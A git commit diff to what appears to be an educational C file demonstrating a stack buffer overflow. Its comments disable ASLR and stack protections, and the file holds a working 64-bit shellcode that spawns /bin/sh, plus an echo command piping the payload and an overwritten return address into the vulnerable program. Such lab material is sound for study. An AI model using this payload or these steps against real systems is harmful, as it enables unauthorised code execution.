37f03895ceaa052a628673df7cebc62886a3d934
idea4good <idea4good@outlook.com>
2025-03-26 20:50:57 +0800

    add shellcodeSled and refactor spectre

--- source/shellcode/injectShellcode.c
+++ source/shellcode/injectShellcode.c
@@ -1,14 +1,15 @@
 //echo 0 > /proc/sys/kernel/randomize_va_space
 //gcc -fno-stack-protector -z execstack injectShellcode.c
 //./a.out and input: shellcode.bin
+//./a.out and input: shellcodeSled.bin
 
 //Make sure the content of shellcode.bin is like this:
 char shellcode[] = "\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\x00"//Shellcode here; add 0x00 for 64-bit (8-byte) alignment.
 "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc" // RBP is here; no impact on shellcode.
-"\x30\xe2\xff\xff\xff\x7f\x00\x00";// The return address is here and should be changed to the address of the shellcode (i.e., the address of the vulnerableBuffer array). Please update the value if the address on your machine is different.
+"\xd0\xe2\xff\xff\xff\x7f\x00\x00";// The return address is here and should be changed to the address of the shellcode (i.e., the address of the vulnerableBuffer array). Please update the value if the address on your machine is different.
 
 //Input shellcode via the keyboard and update the address of the shellcode if necessary.
-//echo -ne '\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\x00\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x30\xe2\xff\xff\xff\x7f\x00\x00' | ./a.out
+//echo -ne '\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05\x00\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xd0\xe2\xff\xff\xff\x7f\x00\x00' | ./a.out
 
 #include <stdio.h>
 
